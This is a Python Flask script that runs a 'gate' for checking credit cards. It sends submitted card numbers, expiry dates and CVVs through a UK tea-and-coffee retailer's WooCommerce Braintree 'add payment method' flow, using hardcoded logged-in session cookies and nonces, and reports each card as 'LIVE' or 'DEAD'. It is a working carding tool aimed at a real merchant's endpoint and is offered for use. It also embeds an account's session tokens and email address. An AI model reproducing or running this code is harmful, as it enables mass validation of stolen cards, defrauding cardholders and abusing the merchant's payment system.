from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# === COOKIES (100% VALID) ===
cookies = {
    'wordpress_sec_ed6aaaf2a4c77ec940184ceefa0c74db': 'xodado2963%7C1763385043%7Cg3GwWn5cnninjA05n4TaDvsWt3e3opoKRxXDG66b0Jo%7C9b96bcb55a9d84ef38f614124a2338a1549f35d7a8c6b6d27aeab7ee4a641cd2',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-11-03%2012%3A40%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-11-03%2012%3A40%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'mcforms-38097157-sessionId': '"468c1959-d4f2-4d37-a767-89343550f7c1"',
    'woocommerce_current_currency': 'GBP',
    '_ga': 'GA1.1.1965671026.1762175403',
    'nitroCachedPage': '0',
    '_fbp': 'fb.1.1762175413034.68996333666249601',
    'mailchimp.cart.current_email': 'xodado2963@limtu.com',
    'mailchimp_user_email': 'xodado2963%40limtu.com',
    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'xodado2963%7C1763385043%7Cg3GwWn5cnninjA05n4TaDvsWt3e3opoKRxXDG66b0Jo%7Ca5982df901567bbc386ee9ab123e8834b0d6d94191f58ab3117ac12ddf262ec0',
    '_gcl_au': '1.1.859187404.1762175404.1113773203.1762175440.1762175560',
    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '_ga_81KZY32HGV': 'GS2.1.s1762178226$o2$g1$t1762178392$j54$l0$h2001057033',
    '_ga_0YYGQ7K779': 'GS2.1.s1762178226$o2$g1$t1762178392$j54$l0$h820852459',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method-custom',
}

headers = {
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'x-requested-with': 'XMLHttpRequest',
    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
    'origin': 'https://www.tea-and-coffee.com',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

def braintree_check(cc_num, mm, yy, cvv):
    try:
        # === STEP 1: CLIENT TOKEN ===
        resp1 = requests.post(
            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': '9deae5d2bc'},
            timeout=15
        )
        resp1_data = resp1.json()
        if not resp1_data.get("success"):
            return False
        client_token = resp1_data["data"]

        # === STEP 2: NONCE BANA ===
        bt_url = "https://api.sandbox.braintreegateway.com/merchants/the-kent-sussex-tea-and-coffee-company/payment_methods/credit_cards"
        resp2 = requests.post(
            bt_url,
            json={"creditCard": {"number": cc_num, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}},
            headers={"Authorization": f"Bearer {client_token}", "Content-Type": "application/json"},
            timeout=15
        )
        
        if resp2.status_code != 201:
            return False
        nonce = resp2.json()["paymentMethod"]["nonce"]

        # === STEP 3: FINAL ADD ===
        resp3 = requests.post(
            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data={'action': 'wc_braintree_add_payment_method', 'payment_method_nonce': nonce, '_wpnonce': '9deae5d2bc'},
            timeout=15
        )
        
        return resp3.json().get("success", False)
    
    except Exception as e:
        return False

@app.route('/gate=braintreeauth/cc=<path:cc>', methods=['GET'])
def check_braintree(cc):
    try:
        # Decode URL-encoded parts like %7C → |
        import urllib.parse
        cc = urllib.parse.unquote(cc)
        
        parts = cc.split('|')
        if len(parts) != 4:
            return jsonify({"success": False, "data": {"error": {"message": "Invalid CC format: Use number|mm|yy|cvc"}}}), 400
        
        cc_num, mm, yy, cvv = [p.strip() for p in parts]
        
        if braintree_check(cc_num, mm, yy, cvv):
            return jsonify({"success": True, "data": {"message": "LIVE - Card added!"}})
        else:
            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Card declined!"}}})
    
    except Exception as e:
        return jsonify({"success": False, "data": {"error": {"message": "Server Error"}}}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
